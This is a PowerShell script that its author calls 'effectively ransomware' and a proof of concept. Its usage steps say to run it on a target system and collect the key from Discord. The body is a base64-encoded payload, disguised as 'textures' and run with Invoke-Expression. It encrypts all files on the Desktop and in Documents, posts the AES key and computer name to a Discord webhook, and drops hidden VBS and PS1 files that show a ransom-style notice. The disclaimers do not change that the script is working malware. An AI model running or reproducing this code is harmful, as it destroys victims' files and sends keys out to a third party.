<#=================================================== Beigeworm's File Encryptor (Base64) =======================================================

SYNOPSIS
This script encrypts all files within selected folders, posts the encryption key to a Discord webhook, and starts a non closable window
with a notice to the user.

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**

THIS IS EFFECTIVELY RANSOMWARE - I CANNOT TAKE RESPONSIBILITY FOR LOST FILES!
DO NOT USE THIS ON ANY CRITICAL SYSTEMS OR SYSTEMS WITHOUT PERMISSION
THIS IS A PROOF OF CONCEPT TO WRITE RANSOMWARE IN POWERSHELL AND IS FOR EDUCATIONAL PURPOSES

**WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   **WARNING**   

USAGE
1. Enter your webhook below. (if not pre-defined in a stager file or duckyscript etc)
2. Run the script on target system.
3. Check Discord for the Decryption Key.
4. Use the decryptor to decrypt the files.

CREDIT
Credit and kudos to InfosecREDD for the idea of writing ransomware in Powershell
this is my interpretation of his non publicly available script used in this Talking Sasquatch video.
https://youtu.be/IwfoHN2dWeE
#>

$dc = 'YOUR_WEBHOOK_HERE' (Remove this line if $dc is pre-defined elseware)
$textures = "JEhvc3QuVUkuUmF3VUkuQmFja2dyb3VuZENvbG9yID0gIkJsYWNrIg0KQ2xlYXItSG9zdA0KJHdpZHRoID0gMQ0KJGhlaWdodCA9IDENCltDb25zb2xlXTo6U2V0V2luZG93U2l6ZSgkd2lkdGgsICRoZWlnaHQpDQoNCiR3aHVyaSA9ICIkZGMiDQokU291cmNlRm9sZGVyID0gIiRlbnY6VVNFUlBST0ZJTEVcRGVza3RvcCIsIiRlbnY6VVNFUlBST0ZJTEVcRG9jdW1lbnRzIg0KJGZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkU291cmNlRm9sZGVyIC1GaWxlIC1SZWN1cnNlDQoNCiRDdXN0b21JViA9ICdyN1NiVGZmVE1iTUE0Wm03MGlIQXdBPT0nDQokS2V5ID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQWVzXTo6Q3JlYXRlKCkNCiRLZXkuR2VuZXJhdGVLZXkoKQ0KJElWQnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRDdXN0b21JVikNCiRLZXkuSVYgPSAkSVZCeXRlcw0KJEtleUJ5dGVzID0gJEtleS5LZXkNCiRLZXlTdHJpbmcgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkS2V5Qnl0ZXMpDQoNCkdldC1DaGlsZEl0ZW0gLVBhdGggJFNvdXJjZUZvbGRlciAtRmlsZSAtUmVjdXJzZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAkRmlsZSA9ICRfDQogICAgJEVuY3J5cHRvciA9ICRLZXkuQ3JlYXRlRW5jcnlwdG9yKCkNCiAgICAkQ29udGVudCA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkRmlsZS5GdWxsTmFtZSkNCiAgICAkRW5jcnlwdGVkQ29udGVudCA9ICRFbmNyeXB0b3IuVHJhbnNmb3JtRmluYWxCbG9jaygkQ29udGVudCwgMCwgJENvbnRlbnQuTGVuZ3RoKQ0KICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJEZpbGUuRnVsbE5hbWUsICRFbmNyeXB0ZWRDb250ZW50KQ0KfQ0KDQpmb3JlYWNoICgkZmlsZSBpbiAkZmlsZXMpIHsNCiAgICAkbmV3TmFtZSA9ICRmaWxlLk5hbWUgKyAiLmVuYyINCiAgICAkbmV3UGF0aCA9IEpvaW4tUGF0aCAtUGF0aCAkU291cmNlRm9sZGVyIC1DaGlsZFBhdGggJG5ld05hbWUNCiAgICBSZW5hbWUtSXRlbSAtUGF0aCAkZmlsZS5GdWxsTmFtZSAtTmV3TmFtZSAkbmV3TmFtZQ0KfQ0KDQokYm9keSA9IEB7InVzZXJuYW1lIiA9ICIkZW52OkNPTVBVVEVSTkFNRSIgOyJjb250ZW50IiA9ICJEZWNyeXB0aW9uIEtleTogJEtleVN0cmluZyJ9IHwgQ29udmVydFRvLUpzb24NCklSTSAtVXJpICR3aHVyaSAtTWV0aG9kIFBvc3QgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9qc29uIiAtQm9keSAkYm9keQ0KDQokVG9GaWxlID0gQCcNCkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCiRmdWxsTmFtZSA9IChHZXQtV21pT2JqZWN0IFdpbjMyX1VzZXJBY2NvdW50IC1GaWx0ZXIgIk5hbWUgPSAnJEVudjpVc2VyTmFtZSciKS5GdWxsTmFtZQ0KJGZvcm0gPSBOZXctT2JqZWN0IFdpbmRvd3MuRm9ybXMuRm9ybQ0KJGZvcm0uVGV4dCA9ICIgICoqWU9VUiBGSUxFUyBIQVZFIEJFRU4gRU5DUllQVEVEISoqIg0KJGZvcm0uRm9udCA9ICdNaWNyb3NvZnQgU2FucyBTZXJpZiwxMixzdHlsZT1Cb2xkJw0KJGZvcm0uU2l6ZSA9IE5ldy1PYmplY3QgRHJhd2luZy5TaXplKDgwMCwgNjAwKQ0KJGZvcm0uU3RhcnRQb3NpdGlvbiA9ICdDZW50ZXJTY3JlZW4nDQokZm9ybS5CYWNrQ29sb3IgPSBbU3lzdGVtLkRyYXdpbmcuQ29sb3JdOjpCbGFjaw0KJGZvcm0uRm9ybUJvcmRlclN0eWxlID0gW1N5c3RlbS5XaW5kb3dzLkZvcm1zLkZvcm1Cb3JkZXJTdHlsZV06OkZpeGVkRGlhbG9nDQokZm9ybS5Db250cm9sQm94ID0gJGZhbHNlDQokZm9ybS5Ub3BNb3N0ID0gJHRydWUNCiRmb3JtLkZvbnQgPSAnTWljcm9zb2Z0IFNhbnMgU2VyaWYsMTIsc3R5bGU9Ym9sZCcNCiRmb3JtLkZvcmVDb2xvciA9ICIjRkYwMDAwIg0KDQokdGl0bGUgPSBOZXctT2JqZWN0IFdpbmRvd3MuRm9ybXMuTGFiZWwNCiR0aXRsZS5UZXh0ID0gIiBfX19fX2BuIC8gJycnICAgJycnIFwgYG58JyAnKCkgKCknICd8IGBuIFwnJyAgXiAgJycvIGBuICAgfHx8fHx8fHwgIGBuICAgfHx8fHx8fHwiDQokdGl0bGUuRm9udCA9ICdNaWNyb3NvZnQgU2FucyBTZXJpZiwxNCcNCiR0aXRsZS5BdXRvU2l6ZSA9ICR0cnVlDQokdGl0bGUuTG9jYXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlBvaW50KDMzMCwgMjApDQoNCiRsYWJlbCA9IE5ldy1PYmplY3QgV2luZG93cy5Gb3Jtcy5MYWJlbA0KaWYgKCRmdWxsTmFtZS5MZW5ndGggLW5lIDApew0KICAgICRsYWJlbC5UZXh0ID0gIkhlbGxvICRmdWxsTmFtZSEgWW91ciBGaWxlcyBIYXZlIEJlZW4gRU5DUllQVEVELiINCn1lbHNlew0KICAgICRsYWJlbC5UZXh0ID0gIkhlbGxvIFVzZXIhIFlvdXIgRmlsZXMgSGF2ZSBCZWVuIEVOQ1JZUFRFRC4iDQp9DQokbGFiZWwuRm9udCA9ICdNaWNyb3NvZnQgU2FucyBTZXJpZiwxOCxzdHlsZT1VbmRlcmxpbmUsYm9sZCcNCiRsYWJlbC5BdXRvU2l6ZSA9ICR0cnVlDQokbGFiZWwuTG9jYXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlBvaW50KDYwLCAyMDApDQoNCiRsYWJlbDIgPSBOZXctT2JqZWN0IFdpbmRvd3MuRm9ybXMuTGFiZWwNCiRsYWJlbDIuVGV4dCA9ICIgVG8gcmVjb3ZlciB5b3VyIGZpbGVzIHlvdSB3aWxsIG5lZWQgdGhlIERlY3J5cHRpb24gS2V5IGBuYG5gbiBSdW4gdGhlIERlY3J5cHRvciBzY3JpcHQgYW5kIGVudGVyIHRoZSBrZXkgdG8gcmVjb3ZlciBmaWxlcyBgbmBuYG4gWW91IGNhbiBjbG9zZSB0aGlzIHdpbmRvdyB3aGVuIERlY3J5cHRpb24gaXMgY29tcGxldGUgYG5gbmBuIFdyaXR0ZW4gYnkgQGJlaWdld29ybSAtIEZvbGxvdyBvbiBHaXRodWIgLSBEaXNjb3JkIDogZWdpZWIiDQokbGFiZWwyLkF1dG9TaXplID0gJHRydWUNCiRsYWJlbDIuTG9jYXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5EcmF3aW5nLlBvaW50KDYwLCAyODApDQoNCiRidXR0b24gPSBOZXctT2JqZWN0IFdpbmRvd3MuRm9ybXMuQnV0dG9uDQokYnV0dG9uLlRleHQgPSAiQ2xvc2UiDQokYnV0dG9uLldpZHRoID0gMTIwDQokYnV0dG9uLkhlaWdodCA9IDM1DQokYnV0dG9uLkJhY2tDb2xvciA9IFtTeXN0ZW0uRHJhd2luZy5Db2xvcl06OldoaXRlDQokYnV0dG9uLkZvcmVDb2xvciA9IFtTeXN0ZW0uRHJhd2luZy5Db2xvcl06OkJsYWNrDQokYnV0dG9uLkRpYWxvZ1Jlc3VsdCA9IFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5EaWFsb2dSZXN1bHRdOjpPSw0KJGJ1dHRvbi5Mb2NhdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRyYXdpbmcuUG9pbnQoNjYwLCA1MjApDQokYnV0dG9uLkZvbnQgPSAnTWljcm9zb2Z0IFNhbnMgU2VyaWYsMTIsc3R5bGU9Qm9sZCcNCg0KJGZvcm0uQ29udHJvbHMuQWRkUmFuZ2UoQCgkdGl0bGUsJGxhYmVsLCRsYWJlbDIsJGJ1dHRvbikpDQoNCiRyZXN1bHQgPSAkZm9ybS5TaG93RGlhbG9nKCkNCldoaWxlIChUZXN0LVBhdGggLVBhdGggJGVudjp0bXAvaW5kaWNhdGUpe2lmKCRyZXN1bHQgLWVxIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5EaWFsb2dSZXN1bHRdOjpPSyl7JGZvcm0uU2hvd0RpYWxvZygpfX0NCidADQoNCiRUb1ZicyA9IEAnDQpTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0Kb2JqU2hlbGwuUnVuICJwb3dlcnNoZWxsLmV4ZSAtTm9uSSAtTm9QIC1FeGVjIEJ5cGFzcyAtVyBIaWRkZW4gLUZpbGUgIiIldGVtcCVcd2luLnBzMSIiIiwgMCwgVHJ1ZQ0KJ0ANCg0KJFRvRmlsZSB8IE91dC1GaWxlIC1GaWxlUGF0aCAkZW52OnRtcC93aW4ucHMxIC1BcHBlbmQNCg0KJFZic1BhdGggPSAiJGVudjp0bXBcc2VydmljZS52YnMiDQokVG9WYnMgfCBPdXQtRmlsZSAtRmlsZVBhdGggJFZic1BhdGggLUZvcmNlDQoNCiJpbmRpY2F0ZSIgfCBPdXQtRmlsZSAtRmlsZVBhdGggJGVudjp0bXAvaW5kaWNhdGUgLUFwcGVuZA0KDQomICRWYnNQYXRoDQogDQpzbGVlcCAxDQpybSAtUGF0aCAkVmJzUGF0aCAtRm9yY2UNCnJtIC1QYXRoICIkZW52OnRtcFx3aW4ucHMxIiAtRm9yY2U="
$loadTextures = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($textures))
Invoke-Expression $loadTextures
